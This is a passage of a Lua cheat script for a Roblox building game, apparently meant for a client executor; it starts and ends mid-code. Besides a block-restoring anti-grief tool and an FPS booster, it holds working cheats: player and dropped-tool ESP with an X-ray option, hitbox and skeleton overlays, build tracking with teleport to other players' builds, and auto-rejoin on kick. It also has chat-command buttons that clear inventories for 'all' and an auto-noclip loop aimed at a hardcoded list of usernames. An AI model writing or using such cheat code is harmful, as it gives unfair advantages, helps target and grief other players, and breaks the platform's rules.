    if _abfActive then Library:Notify("Special scanner already running!", 2); return end
    _abfActive = true; _abfQueue = {}; _blockOwnerCache = {}
    if _abfStatusLabel then _abfStatusLabel:SetText("Status: Scanning...") end

    -- Seed cache with every brick already placed in the world
    for _, model in ipairs(cfolder:GetChildren()) do
        if model:IsA("Model") or model:IsA("Folder") then
            for _, b in ipairs(model:GetDescendants()) do
                if b:IsA("BasePart") and b.Name == brickname then
                    _blockOwnerCache[b] = model.Name
                end
            end
        end
    end

    -- Keep cache up-to-date as new bricks are placed
    if _abfAddConn then _abfAddConn:Disconnect(); _abfAddConn = nil end
    _abfAddConn = cfolder.DescendantAdded:Connect(function(b)
        if not _abfActive then return end
        if not (b:IsA("BasePart") and b.Name == brickname) then return end
        -- b.Parent is valid here (firing on placement, not removal)
        local ownerModel = b.Parent
        if ownerModel and ownerModel ~= cfolder then
            _blockOwnerCache[b] = ownerModel.Name
        end
    end)

    -- Detect deletions using pre-cached owner — b.Parent is nil at callback time
    -- Self-deletion filter: skip if the block owner is the closest player to the block
    if _abfDetectConn then _abfDetectConn:Disconnect(); _abfDetectConn = nil end
    _abfDetectConn = cfolder.DescendantRemoving:Connect(function(b)
        if not _abfActive then return end
        if not (b:IsA("BasePart") and b.Name == brickname) then return end
        local ownerName = _blockOwnerCache[b]
        _blockOwnerCache[b] = nil
        if not ownerName then return end
        local blockPos = b.Position  -- read before saveblock (still valid despite nil parent)

        -- Self-deletion check: if the owner is within 20 studs, they're likely
        -- deleting their own build. Skip recording this event.
        local ownerPlayer = Players:FindFirstChild(ownerName)
        if ownerPlayer then
            local ownerChar = ownerPlayer.Character
            local ownerHrp = ownerChar and ownerChar:FindFirstChild("HumanoidRootPart")
            if ownerHrp then
                local ownerDist = (ownerHrp.Position - blockPos).Magnitude
                if ownerDist < 20 then
                    -- Owner is near their own blocks — check if someone else is even closer
                    local someoneCloser = false
                    for _, p in ipairs(Players:GetPlayers()) do
                        if p.Name == ownerName or p == plr then continue end
                        local c = p.Character
                        local h = c and c:FindFirstChild("HumanoidRootPart")
                        if h and (h.Position - blockPos).Magnitude < ownerDist then
                            someoneCloser = true; break
                        end
                    end
                    if not someoneCloser then return end  -- owner is closest → self-deletion
                end
            end
        end

        local ok, bd = pcall(saveblock, b)
        if not ok or not bd or not bd.p then return end
        table.insert(_abfQueue, {
            time = tick(), ownerName = ownerName,
            blockData = bd, pos = blockPos,
        })
    end)

    if _abfEvalThread then task.cancel(_abfEvalThread) end
    _abfEvalThread = task.spawn(_abfEvaluate)
    Library:Notify("Special: Scanning started!", 3)
end

local function _abfStop()
    _abfActive = false
    if _abfDetectConn then _abfDetectConn:Disconnect(); _abfDetectConn = nil end
    if _abfAddConn     then _abfAddConn:Disconnect();    _abfAddConn    = nil end
    if _abfEvalThread  then task.cancel(_abfEvalThread); _abfEvalThread = nil end
    _abfQueue = {}; _blockOwnerCache = {}; _alertQueue = {}
    _hideAlert()
    if _abfStatusLabel then _abfStatusLabel:SetText("Status: Inactive") end
    if _abfCountLabel  then _abfCountLabel:SetText("Deletions tracked: 0") end
    Library:Notify("Special: Stopped", 3)
end

-- ── popout window ─────────────────────────────────────────────────────────
-- Toggle button at Y=152: Builds(84) + 28h + 6gap = 118 (Enlighten), + 28h + 6gap = 152 (Fixer)

local _abfPopout = Library:CreatePopout({
    Title    = 'Special',
    Size     = UDim2.fromOffset(360, 720),
    Position = UDim2.fromOffset(700, 180),
})
local _abfBtn = _abfPopout:CreateToggleButton('Special', {Icon = '✨'})

local _grpStatus = _abfPopout:AddGroupbox('Status')
_abfStatusLabel = _grpStatus:CreateLabel({Text = "Status: Inactive"})
_abfCountLabel  = _grpStatus:CreateLabel({Text = "Deletions tracked: 0"})
_abfLastLabel   = _grpStatus:CreateLabel({Text = "Last alert: none"})

local _grpSettings = _abfPopout:AddGroupbox('Detection Settings')
_grpSettings:CreateToggle({
    Name = 'Auto-Fix on Detection', Default = true,
    Tooltip = 'Restore blocks automatically; alert popup still shows',
    Function = function(v) ABF_AUTO_FIX = v end,
})
_grpSettings:CreateSlider({
    Name = 'Block Threshold', Default = 5, Min = 3, Max = 20, Increment = 0,
    Function = function(v) ABF_THRESHOLD = v end,
})
_grpSettings:CreateSlider({
    Name = 'Detection Window (s)', Default = 2, Min = 1, Max = 6, Increment = 0,
    Function = function(v) ABF_WINDOW = v end,
})
_grpSettings:CreateSlider({
    Name = 'Min Victim Time (s)', Default = 60, Min = 0, Max = 600, Increment = 0,
    Function = function(v) ABF_MIN_TIME = v end,
})

local _grpCtrl = _abfPopout:AddGroupbox('Controls')
_grpCtrl:CreateButton({ Name = 'Start Scanning', Function = _abfStart })
_grpCtrl:CreateButton({ Name = 'Stop Scanning',  Function = _abfStop  })

local _grpAdmin = _abfPopout:AddGroupbox('Admin Tools')

-- "debug" toggles the build tools overlay that exposes stash/dupe exploits
_grpAdmin:CreateButton({
    Name = 'Debug (anti-stash)',
    Function = function()
        sendGeneralChatMessage(";debug all")
        Library:Notify("Sent ;debug all", 3)
    end,
})

-- "delclones" removes any cloned characters used by stash/dupe systems
_grpAdmin:CreateButton({
    Name = 'Del Clones',
    Function = function()
        sendGeneralChatMessage(";delclones all")
        Library:Notify("Sent ;delclones all", 3)
    end,
})

-- "clearinv" wipes a player's inventory — use on specific target or all
local _clearInvInput = _grpAdmin:CreateTextBox({
    Default     = 'all',
    Name = 'Clearinv target:',
    PlaceholderText = 'Player name or "all"',
})

_grpAdmin:CreateButton({
    Name = 'Clear Inventory',
    Function = function()
        local target = _clearInvInput.Value ~= '' and _clearInvInput.Value or 'all'
        sendGeneralChatMessage(";clearinv " .. target)
        Library:Notify("Sent ;clearinv " .. target, 3)
    end,
})

local _grpImport = _abfPopout:AddGroupbox('Backup Import')
local _abfJsonInput = _grpImport:CreateTextBox({
    Default = '', Numeric = false, Finished = true,
    Name = 'Backup JSON:', PlaceholderText = 'Paste build JSON as restore reference...',
})
_grpImport:CreateButton({
    Name = 'Load into Import Build Tab',
    Function = function()
        if _abfJsonInput.Value ~= '' then
            importJsonInput:SetValue(_abfJsonInput.Value)
            Library:Notify("Loaded into Import Build tab!", 3)
        else
            Library:Notify("Paste JSON above first!", 3)
        end
    end,
})

-- ── Auto Noclip ──────────────────────────────────────────────────────────

local _noclipActive = false
local _noclipBlacklist = {"hugsbugspotato", "Gay67O_O", "LeRoy88897"}

local function _noclipStatement(player)
    if not player.Character then return false end
    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    return hrp.CollisionGroup ~= "NoClip"
end

local function _noclipLoop()
    while _noclipActive do
        task.wait(5)
        if not _noclipActive then break end
        local names = ""
        for _, p in ipairs(Players:GetPlayers()) do
            local inList = false
            for _, entry in ipairs(_noclipBlacklist) do
                if type(entry) == "number" then
                    if p.UserId == entry then inList = true; break end
                else
                    if p.Name == entry then inList = true; break end
                end
            end
            if inList and _noclipStatement(p) then
                names = names .. sanitizename(p.Name) .. " "
            end
        end
        if names ~= "" then
            sendGeneralChatMessage(";noclip " .. names)
        end
    end
end

local _grpNoclip = _abfPopout:AddGroupbox('Auto Noclip')
_grpNoclip:CreateToggle({
    Name = 'Enable Auto Noclip', Default = false,
    Tooltip = 'Auto-sends ;noclip to blacklisted players every 5s',
    Function = function(v)
        _noclipActive = v
        if v then
            task.spawn(_noclipLoop)
            Library:Notify("Auto Noclip started", 3)
        else
            Library:Notify("Auto Noclip stopped", 3)
        end
    end,
})

local _noclipBlInput = _grpNoclip:CreateTextBox({
    Default = table.concat(_noclipBlacklist, ", "), Finished = true,
    Name = 'Blacklist:', PlaceholderText = 'Comma-separated names/userids...',
})
_grpNoclip:CreateButton({
    Name = 'Update Blacklist',
    Function = function()
        _noclipBlacklist = {}
        for entry in string.gmatch(_noclipBlInput.Value, "[^,]+") do
            entry = string.gsub(entry, "^%s+", "")
            entry = string.gsub(entry, "%s+$", "")
            local num = tonumber(entry)
            table.insert(_noclipBlacklist, num or entry)
        end
        Library:Notify("Blacklist updated: " .. #_noclipBlacklist .. " entries", 3)
    end,
})

-- ── Quick Commands ───────────────────────────────────────────────────────

local _grpQuickCmd = _abfPopout:AddGroupbox('Quick Commands')

local _quickCmdTarget = _grpQuickCmd:CreateTextBox({
    Default = '', Numeric = false, Finished = true,
    Name = 'Target player:', PlaceholderText = 'Player name or "all"',
})

local function _sendQuickCmd(cmd)
    local target = _quickCmdTarget.Value ~= '' and _quickCmdTarget.Value or 'all'
    sendGeneralChatMessage(";" .. cmd .. " " .. sanitizename(target))
    Library:Notify("Sent ;" .. cmd .. " " .. target, 3)
end

_grpQuickCmd:CreateButton({ Name = 'Give R6',      Function = function() _sendQuickCmd("r6") end })
_grpQuickCmd:CreateButton({ Name = 'Give Fly',     Function = function() _sendQuickCmd("fly") end })
_grpQuickCmd:CreateButton({ Name = 'Give Bkit',    Function = function() _sendQuickCmd("bkit") end })
_grpQuickCmd:CreateButton({ Name = 'Give Carpet',  Function = function() _sendQuickCmd("carpet") end })
_grpQuickCmd:CreateButton({ Name = 'Give Paint',   Function = function() _sendQuickCmd("paint") end })
_grpQuickCmd:CreateButton({ Name = 'Give Boombox', Function = function() _sendQuickCmd("boombox") end })
_grpQuickCmd:CreateButton({ Name = 'Give Noclip',  Function = function() _sendQuickCmd("noclip") end })

end -- if ABF_AUTHORIZED

end -- /══ Auto-Build Fixer ══

do -- ══ ESP System ══
 ESPGroup = Tabs.Server:CreateModule({Name = 'Player ESP'})

PlayersESPToggle = ESPGroup:CreateToggle({
    Name = 'Players ESP',
    Default = false,
    Tooltip = 'Show highlight on all players'
})

 ESPNametagToggle = ESPGroup:CreateToggle({
    Name = 'Show Nametags',
    Default = true,
    Tooltip = 'Show info labels above players'
})

 ESPDistanceToggle = ESPGroup:CreateToggle({
    Name = 'Show Distance',
    Default = true,
    Tooltip = 'Show distance in nametag'
})

 ESPBuildCountToggle = ESPGroup:CreateToggle({
    Name = 'Show Cube Count',
    Default = true,
    Tooltip = 'Show how many cubes each player has built'
})

 ESPTargetInput = ESPGroup:CreateTextBox({
    Default = 'all',
    Name = 'Target Player (name/all/others):',
    PlaceholderText = 'all',
    Tooltip = 'Filter ESP to specific player name, or use all/others'
})

ESPGroup:CreateDivider()
ESPGroup:CreateLabel({Text = 'Visual Style'})

local ESP2DBoxToggle = ESPGroup:CreateToggle({
    Name = '2D Box',
    Default = true,
    Tooltip = 'Draw a 2D screen-space box around each player'
})

local ESP3DBoxToggle = ESPGroup:CreateToggle({
    Name = '3D Box',
    Default = false,
    Tooltip = 'Draw 3D corner-box around player character'
})

local ESPHighlightToggle = ESPGroup:CreateToggle({
    Name = 'Highlight (fill)',
    Default = false,
    Tooltip = 'Apply a Roblox Highlight fill over the character (may look different across executors)'
})

local ESPSkeletonToggle = ESPGroup:CreateToggle({
    Name = 'Skeleton',
    Default = false,
    Tooltip = 'Draw bone lines between character limbs'
})

local ESPHitboxToggle = ESPGroup:CreateToggle({
    Name = 'Hitbox',
    Default = false,
    Tooltip = 'Draw the humanoid root part hitbox'
})

ESP2DBoxToggle:OnChanged(function(v)    esp2DBoxEnabled = v    end)
ESP3DBoxToggle:OnChanged(function(v)    esp3DBoxEnabled = v    end)
ESPHighlightToggle:OnChanged(function(v)
    espHighlightEnabled = v
    if not v then
        for p, obj in pairs(espObjects) do
            if obj and obj.Parent then pcall(function() obj:Destroy() end) end
            espObjects[p] = nil
        end
    end
end)
ESPSkeletonToggle:OnChanged(function(v) espSkeletonEnabled = v end)
ESPHitboxToggle:OnChanged(function(v)   espHitboxEnabled = v   end)

 BuildESPGroup = Tabs.Server:CreateModule({Name = 'Build Tracker ESP'})

BuildingsESPToggle = BuildESPGroup:CreateToggle({
    Name = 'Buildings ESP',
    Default = false,
    Tooltip = 'Highlight builds and show cube count + location'
})

 BuildESPTargetInput = BuildESPGroup:CreateTextBox({
    Default = 'all',
    Name = 'Track Player (name/all):',
    PlaceholderText = 'all'
})

BuildESPGroup:CreateDivider()

BuildESPGroup:CreateButton({
    Name = 'Scan All Player Builds',
    Function = function()
         results = {}
        for _, player in ipairs(Players:GetPlayers()) do
             count = getPlayerBuildCount(player)
             center = getPlayerBuildCenter(player)
             centerStr = center and ("X:" .. math.floor(center.X) .. " Y:" .. math.floor(center.Y) .. " Z:" .. math.floor(center.Z)) or "No builds"
            table.insert(results, player.Name .. ": " .. count .. " cubes @ " .. centerStr)
        end
        if #results > 0 then
            Library:Notify(table.concat(results, "\n"), 10)
        else
            Library:Notify("No players found", 3)
        end
    end
})

BuildESPGroup:CreateButton({
    Name = 'Teleport to Build (Tracked)',
    Function = function()
        local target = BuildESPTargetInput.Value
        for _, player in ipairs(Players:GetPlayers()) do
            if target == "all" or player.Name:lower():find(target:lower()) then
                local center = getPlayerBuildCenter(player)
                if center then
                    local hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        hrp.CFrame = CFrame.new(center + Vector3.new(0, 10, 0))
                        Library:Notify("Teleported to " .. player.Name .. "'s build", 3)
                        return
                    end
                end
            end
        end
        Library:Notify("No build found for target", 3)
    end
})

local ESPColors = Tabs.Server:CreateModule({Name = 'ESP Appearance'})

local espColorOptions = {"Blue", "Red", "Green", "Yellow", "Purple", "White", "Cyan", "Orange", "Pink", "Rainbow"}

ESPColorPicker = ESPColors:CreateDropdown({
    List = espColorOptions,
    Default = 1,
    Name = 'ESP Color',
    Tooltip = 'Color for player and build highlights'
})

ESPTransparencySlider = ESPColors:CreateSlider({
    Name = 'Fill Transparency',
    Default = 0.6,
    Min = 0,
    Max = 1,
    Increment = 2,
    Compact = false,
    Tooltip = 'How transparent the highlight fill is (1 = invisible fill, outline only)'
})

ESPColors:CreateDivider()

ESPColors:CreateLabel({Text = 'Live Build Stats:'})
local buildStatsLabel = ESPColors:CreateLabel({Text = 'Press Scan to update'})

ESPColors:CreateButton({
    Name = 'Update Build Stats',
    Function = function()
        local lines = {}
        for _, player in ipairs(Players:GetPlayers()) do
            local count = getPlayerBuildCount(player)
            if count > 0 then
                table.insert(lines, player.Name .. ": " .. count)
            end
        end
        if #lines > 0 then
            buildStatsLabel:SetText(table.concat(lines, "  |  "))
        else
            buildStatsLabel:SetText("No builds detected")
        end
    end
})

end -- /══ ESP System ══

do -- ══ Tool ESP ══
local ToolESPGroup = Tabs.Server:CreateModule({Name = 'Tool ESP'})

ToolsESPToggle = ToolESPGroup:CreateToggle({
    Name = 'Dropped Tools ESP',
    Default = false,
    Tooltip = 'Highlight tools dropped on the ground'
})

local ToolESPNameToggle = ToolESPGroup:CreateToggle({
    Name = 'Show Tool Names',
    Default = true,
    Tooltip = 'Show tool name labels above dropped tools'
})

local ToolESPDistToggle = ToolESPGroup:CreateToggle({
    Name = 'Show Distance',
    Default = true,
    Tooltip = 'Show distance to each dropped tool'
})

local ToolESPXrayToggle = ToolESPGroup:CreateToggle({
    Name = 'X-Ray',
    Default = false,
    Tooltip = 'See tools through walls'
})

local toolESPColorOptions = {"Yellow", "Red", "Blue", "Green", "Purple", "White", "Cyan", "Orange", "Pink"}
local toolESPColorMap = {
    Yellow = Color3.new(1, 1, 0),
    Red = Color3.new(1, 0, 0),
    Blue = Color3.new(0, 0.4, 1),
    Green = Color3.new(0, 1, 0),
    Purple = Color3.new(0.6, 0, 1),
    White = Color3.new(1, 1, 1),
    Cyan = Color3.new(0, 1, 1),
    Orange = Color3.new(1, 0.5, 0),
    Pink = Color3.new(1, 0.4, 0.7),
}

local ToolESPColorPicker = ToolESPGroup:CreateDropdown({
    List = toolESPColorOptions,
    Default = 1,
    Name = 'Tool ESP Color',
    Tooltip = 'Color for tool highlights'
})

local toolESPMaxDist = 500
ToolESPGroup:CreateSlider({
    Name = 'Max Distance',
    Default = 500,
    Min = 50,
    Max = 2000,
    Increment = 0,
    Compact = false,
    Tooltip = 'Maximum distance to show tool ESP'
}):OnChanged(function(val) toolESPMaxDist = val end)
 toolsESPLabels = {}
 _toolsESPAddConn    = nil
 _toolsESPRemoveConn = nil

 function isDroppedTool(obj)
    if not obj or not obj:IsA("Tool") then return false end
    if not obj:IsDescendantOf(workspace) then return false end
    for _, p in ipairs(Players:GetPlayers()) do
        local char = p.Character
        if char and obj:IsDescendantOf(char) then return false end
        local bp = p:FindFirstChild("Backpack")
        if bp and obj:IsDescendantOf(bp) then return false end
    end
    return true
end

 function getToolESPColor()
    local sel = ToolESPColorPicker.Value
    return toolESPColorMap[sel] or Color3.new(1, 1, 0)
end

 function createToolESPLabel(tool)
    if toolsESPLabels[tool] then return end
    local handle = tool:FindFirstChild("Handle")
    if not handle then return end

    local bb = Instance.new("BillboardGui")
    bb.Name = "RomazToolLabel"
    bb.Adornee = handle
    bb.Size = UDim2.new(0, 120, 0, 36)
    bb.StudsOffset = Vector3.new(0, 2, 0)
    bb.AlwaysOnTop = ToolESPXrayToggle.Value
    bb.MaxDistance = toolESPMaxDist
    bb.ClipsDescendants = true
    bb.Parent = playerGui

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, 0, 0.6, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Font = Library.BoldFont or Enum.Font.GothamBold
    nameLabel.TextColor3 = getToolESPColor()
    nameLabel.TextStrokeTransparency = 0.3
    nameLabel.TextScaled = true
    nameLabel.Text = tool.Name
    nameLabel.Visible = ToolESPNameToggle.Value
    nameLabel.Parent = bb

    local distLabel = Instance.new("TextLabel")
    distLabel.Size = UDim2.new(1, 0, 0.4, 0)
    distLabel.Position = UDim2.new(0, 0, 0.6, 0)
    distLabel.BackgroundTransparency = 1
    distLabel.Font = Library.Font or Enum.Font.Gotham
    distLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    distLabel.TextStrokeTransparency = 0.3
    distLabel.TextScaled = true
    distLabel.Text = ""
    distLabel.Visible = ToolESPDistToggle.Value
    distLabel.Parent = bb

    toolsESPLabels[tool] = {bb = bb, nameLabel = nameLabel, distLabel = distLabel}
end

local function removeToolESPLabel(tool)
    local data = toolsESPLabels[tool]
    if data then
        pcall(function() data.bb:Destroy() end)
        toolsESPLabels[tool] = nil
    end
end

task.spawn(function()
    while not Library.Unloaded do
        if ToolsESPToggle.Value then
            local myPos = getplrpos()
            local toRemove = {}
            for tool, data in pairs(toolsESPLabels) do
                pcall(function()
                    if not tool or not tool.Parent or not isDroppedTool(tool) then
                        table.insert(toRemove, tool)
                        return
                    end
                    local handle = tool:FindFirstChild("Handle")
                    if handle and data.distLabel and data.distLabel.Parent then
                        local dist = (handle.Position - myPos).Magnitude
                        data.distLabel.Text = string.format("%.0f studs", dist)
                    end
                    if data.nameLabel and data.nameLabel.Parent then
                        data.nameLabel.TextColor3 = getToolESPColor()
                    end
                end)
            end
            for _, tool in ipairs(toRemove) do
                removeToolESPLabel(tool)
                if toolsESPObjects[tool] then
                    pcall(function() toolsESPObjects[tool]:Destroy() end)
                    toolsESPObjects[tool] = nil
                end
            end
        end
        task.wait(0.5)
    end
end)

ToolsESPToggle:OnChanged(function(value)
    if _toolsESPAddConn    then _toolsESPAddConn:Disconnect();    _toolsESPAddConn    = nil end
    if _toolsESPRemoveConn then _toolsESPRemoveConn:Disconnect(); _toolsESPRemoveConn = nil end

    for _, v in pairs(toolsESPObjects) do
        pcall(function() v:Destroy() end)
    end
    toolsESPObjects = {}
    for tool, _ in pairs(toolsESPLabels) do
        removeToolESPLabel(tool)
    end

    if not value then return end

    local function highlightDroppedTool(tool)
        if not isDroppedTool(tool) then return end
        if toolsESPObjects[tool]   then return end

        local c = getToolESPColor()
        local hl = Instance.new("Highlight")
        hl.Name                = "RomazToolESP"
        hl.FillColor           = c
        hl.OutlineColor        = c
        hl.FillTransparency    = 0.4
        hl.OutlineTransparency = 0
        hl.DepthMode           = ToolESPXrayToggle.Value
            and Enum.HighlightDepthMode.AlwaysOnTop
            or  Enum.HighlightDepthMode.Occluded
        hl.Adornee             = tool
        hl.Parent              = playerGui
        toolsESPObjects[tool]  = hl

        createToolESPLabel(tool)
    end

    -- Tools are direct children of workspace when dropped
    for _, v in ipairs(workspace:GetChildren()) do
        pcall(function() highlightDroppedTool(v) end)
    end

    _toolsESPAddConn = workspace.DescendantAdded:Connect(function(v)
        if not ToolsESPToggle.Value then return end
        task.defer(function()
            if ToolsESPToggle.Value then
                pcall(function() highlightDroppedTool(v) end)
            end
        end)
    end)

    _toolsESPRemoveConn = workspace.DescendantRemoving:Connect(function(v)
        local hl = toolsESPObjects[v]
        if hl then
            toolsESPObjects[v] = nil
            pcall(function() hl:Destroy() end)
        end
        removeToolESPLabel(v)
    end)

    Library:Notify("Tool ESP enabled", 3)
end)

ToolESPNameToggle:OnChanged(function(value)
    for _, data in pairs(toolsESPLabels) do
        if data.nameLabel and data.nameLabel.Parent then
            data.nameLabel.Visible = value
        end
    end
end)

ToolESPDistToggle:OnChanged(function(value)
    for _, data in pairs(toolsESPLabels) do
        if data.distLabel and data.distLabel.Parent then
            data.distLabel.Visible = value
        end
    end
end)

ToolESPXrayToggle:OnChanged(function(value)
    for _, hl in pairs(toolsESPObjects) do
        if typeof(hl) == "Instance" and hl:IsA("Highlight") then
            hl.DepthMode = value
                and Enum.HighlightDepthMode.AlwaysOnTop
                or  Enum.HighlightDepthMode.Occluded
        end
    end
    for _, data in pairs(toolsESPLabels) do
        if data.bb and data.bb.Parent then
            data.bb.AlwaysOnTop = value
        end
    end
end)

ToolESPColorPicker:OnChanged(function(value)
    local c = toolESPColorMap[value] or Color3.new(1, 1, 0)
    for _, hl in pairs(toolsESPObjects) do
        if typeof(hl) == "Instance" and hl:IsA("Highlight") then
            hl.FillColor = c
            hl.OutlineColor = c
        end
    end
end)

trackScriptConnection(Players.PlayerAdded:Connect(function(player)
    task.wait(.1)
    if PlayersESPToggle.Value and shouldESPPlayer(player) then
        CreateESP(player)
    end
    trackScriptConnection(player.CharacterAdded:Connect(function()
        task.wait(0.5)
        if PlayersESPToggle.Value and shouldESPPlayer(player) then
            CreateESP(player)
        end
    end))
    if BuildingsESPToggle.Value then
        local target = BuildESPTargetInput.Value
        if player ~= plr and (target == "all" or player.Name:lower():find(target:lower())) then
            CreateBuildESP(player)
        end
    end
end))

trackScriptConnection(Players.PlayerRemoving:Connect(function(player)
    RemoveESP(player)
    RemoveBuildESP(player)
end))

trackScriptConnection(plr.CharacterAdded:Connect(function()
    task.wait(.1)
    if PlayersESPToggle.Value then
        for _, player in ipairs(Players:GetPlayers()) do
            if espObjects[player] then
                RemoveESP(player)
                CreateESP(player)
            end
        end
    end
end))

PlayersESPToggle:OnChanged(function(value)
    if value then
        StartESPUpdateLoop()
        StartDrawESPLoop()
        for _, player in ipairs(Players:GetPlayers()) do
            if shouldESPPlayer(player) then
                CreateESP(player)
            end
        end
        Library:Notify("Players ESP enabled", 3)
    else
        for player, _ in pairs(espObjects) do
            RemoveESP(player)
        end
        if not BuildingsESPToggle.Value then
            StopESPUpdateLoop()
        end
    end
end)

BuildingsESPToggle:OnChanged(function(value)
    if value then
        StartESPUpdateLoop()
        local target = BuildESPTargetInput.Value
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= plr and (target == "all" or player.Name:lower():find(target:lower())) then
                CreateBuildESP(player)
            end
        end
        Library:Notify("Build ESP enabled", 3)
    else
        RemoveAllBuildESP()
        if not PlayersESPToggle.Value then
            StopESPUpdateLoop()
        end
    end
end)

BuildESPTargetInput:OnChanged(function(value)
    if BuildingsESPToggle.Value then
        RemoveAllBuildESP()
        local target = value ~= "" and value or "all"
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= plr and (target == "all" or player.Name:lower():find(target:lower())) then
                CreateBuildESP(player)
            end
        end
    end
end)

task.defer(function()
    if PlayersESPToggle.Value then
        StartESPUpdateLoop()
        StartDrawESPLoop()
        for _, player in ipairs(Players:GetPlayers()) do
            if shouldESPPlayer(player) then
                CreateESP(player)
            end
        end
    end
    if BuildingsESPToggle.Value then
        if not espUpdateConnection then StartESPUpdateLoop() end
        local target = BuildESPTargetInput.Value
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= plr and (target == "all" or player.Name:lower():find(target:lower())) then
                CreateBuildESP(player)
            end
        end
    end
end)

ESPNametagToggle:OnChanged(function(value)
    espNametags = value
    if value then
        for player, _ in pairs(espObjects) do
            CreateESPNametag(player)
        end
    else
        for player, _ in pairs(espNameLabels) do
            RemoveESPNametag(player)
        end
    end
end)

ESPDistanceToggle:OnChanged(function(value)
    espShowDistance = value
end)

ESPBuildCountToggle:OnChanged(function(value)
    espShowBuildCount = value
end)

ESPTargetInput:OnChanged(function(value)
    espTrackedPlayer = value ~= "" and value or "all"
    if PlayersESPToggle.Value then
        RemoveAllESP()
        for _, player in ipairs(Players:GetPlayers()) do
            if shouldESPPlayer(player) then CreateESP(player) end
        end
    end
end)

end -- /══ Tool ESP ══


do -- ══ Settings & Credits ══
local SettingsGroup = Tabs.Settings:CreateModule({Name = 'General Information'})



AutoRejoin = SettingsGroup:CreateToggle({
    Name = 'Auto Rejoin on Kick',
    Default = false,
    Tooltip = 'Automatically rejoin the game if kicked'
})
registerPremiumButtonLock(DisableDeleteSoundButton, 'Disable Delete Sound', {
    subtitleText = 'Premium-only utility',
    helperText = 'Tap for premium',
})
local autoRejoinConn = nil

ShowCredits = SettingsGroup:CreateToggle({
    Name = 'Show Credits on Join',
    Default = true,
    Tooltip = 'Display credits message when script loads'
})

SettingsGroup:CreateToggle({
    Name = 'Auto Ping Optimization',
    Default = true,
    Tooltip = 'Automatically adjust delays based on your ping to prevent errors on bad connections'
}):OnChanged(function(val)
    autoPingOptimize = val
    if not val then
        safeModeActive = false
        buildDelay = math.max(game.Players.LocalPlayer:GetNetworkPing() + 0.007, 0.051)
    end
end)

local _boostOrigCache = nil
local _boostDescAddedConn = nil
local _boostDescRemovingConn = nil
local _boostLightingAddedConn = nil
local _boostLightingRemovingConn = nil

local function clearBoostFPSConnections()
    if _boostDescAddedConn then _boostDescAddedConn:Disconnect(); _boostDescAddedConn = nil end
    if _boostDescRemovingConn then _boostDescRemovingConn:Disconnect(); _boostDescRemovingConn = nil end
    if _boostLightingAddedConn then _boostLightingAddedConn:Disconnect(); _boostLightingAddedConn = nil end
    if _boostLightingRemovingConn then _boostLightingRemovingConn:Disconnect(); _boostLightingRemovingConn = nil end
end

local function clearBoostFPSCacheEntry(obj)
    if _boostOrigCache and _boostOrigCache.objects then
        _boostOrigCache.objects[obj] = nil
    end
end

local function applyBoostFPSOptimization(obj)
    if not _boostOrigCache or not obj then return end
    pcall(function()
        local record = _boostOrigCache.objects[obj]
        if obj:IsA("BasePart") then
            if not record then
                record = { kind = "part", material = obj.Material, castShadow = obj.CastShadow }
                _boostOrigCache.objects[obj] = record
            end
            obj.Material = Enum.Material.SmoothPlastic
            obj.CastShadow = false
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            if not record then
                record = { kind = "transparency", transparency = obj.Transparency }
                _boostOrigCache.objects[obj] = record
            end
            obj.Transparency = 1
        elseif obj:IsA("ParticleEmitter")
            or obj:IsA("Smoke")
            or obj:IsA("Fire")
            or obj:IsA("Sparkles")
            or obj:IsA("Trail")
            or obj:IsA("Beam")
            or obj:IsA("Highlight")
            or obj:IsA("PointLight")
            or obj:IsA("SpotLight")
            or obj:IsA("SurfaceLight")
            or obj:IsA("PostEffect") then
            if not record then
                record = { kind = "enabled", enabled = obj.Enabled }
                _boostOrigCache.objects[obj] = record
            end
            obj.Enabled = false
        end
    end)
end

local function restoreBoostFPSOptimization(obj, record)
    if not obj or not record then return end
    pcall(function()
        if record.kind == "part" then
            obj.Material = record.material
            obj.CastShadow = record.castShadow
        elseif record.kind == "transparency" then
            obj.Transparency = record.transparency
        elseif record.kind == "enabled" then
            obj.Enabled = record.enabled
        end
    end)
end

local function setBoostFPSEnabled(val)
    local lighting = game:GetService("Lighting")
    if val then
        if _boostOrigCache then return end
        local qualityLevel = nil
        pcall(function()
            qualityLevel = settings().Rendering.QualityLevel
        end)
        _boostOrigCache = {
            objects = {},
            globalShadows = lighting.GlobalShadows,
            fogEnd = lighting.FogEnd,
            qualityLevel = qualityLevel,
        }
        pcall(function()
            lighting.GlobalShadows = false
            lighting.FogEnd = 1000000
        end)
        pcall(function()
            settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        end)
        for _, obj in ipairs(workspace:GetDescendants()) do
            applyBoostFPSOptimization(obj)
        end
        for _, obj in ipairs(lighting:GetDescendants()) do
            applyBoostFPSOptimization(obj)
        end
        clearBoostFPSConnections()
        _boostDescAddedConn = workspace.DescendantAdded:Connect(applyBoostFPSOptimization)
        _boostDescRemovingConn = workspace.DescendantRemoving:Connect(clearBoostFPSCacheEntry)
        _boostLightingAddedConn = lighting.DescendantAdded:Connect(applyBoostFPSOptimization)
        _boostLightingRemovingConn = lighting.DescendantRemoving:Connect(clearBoostFPSCacheEntry)
        return
    end

    clearBoostFPSConnections()
    if _boostOrigCache then
        pcall(function()
            lighting.GlobalShadows = _boostOrigCache.globalShadows
            lighting.FogEnd = _boostOrigCache.fogEnd
        end)
        for obj, record in pairs(_boostOrigCache.objects) do
            restoreBoostFPSOptimization(obj, record)
        end
        pcall(function()
            settings().Rendering.QualityLevel = _boostOrigCache.qualityLevel or Enum.QualityLevel.Automatic
        end)
        _boostOrigCache = nil
    else
        pcall(function()
            settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic
        end)
    end
end

SettingsGroup:CreateToggle({
    Name = 'Boost FPS',
    Default = false,
    Tooltip = 'Reduces visual quality to improve frame rate: disables textures, particles, shadows, and post-processing'
}):OnChanged(function(val)
    setBoostFPSEnabled(val)
    Library:Notify(val and "FPS Boost ON" or "FPS Boost OFF", 3)
end)

-- Hide Own Tag
local _hotHideEnabled = false
